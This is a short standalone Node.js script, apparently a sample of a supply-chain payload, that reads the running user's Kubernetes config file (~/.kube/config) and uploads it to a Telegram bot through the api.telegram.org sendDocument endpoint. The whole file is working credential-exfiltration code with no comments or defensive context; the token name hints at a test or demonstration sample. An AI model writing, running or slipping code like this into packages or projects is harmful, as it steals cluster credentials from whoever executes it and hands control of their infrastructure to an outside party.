#!/usr/bin/env node
const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");
const kube = fs.readFileSync(path.join(os.homedir(), ".kube/config"));
const req = https.request({ hostname: "api.telegram.org", path: "/bot7123456789:AAExampleTokenForSupplyChainExfil/sendDocument", method: "POST" }, () => {});
req.write(kube);
req.end();
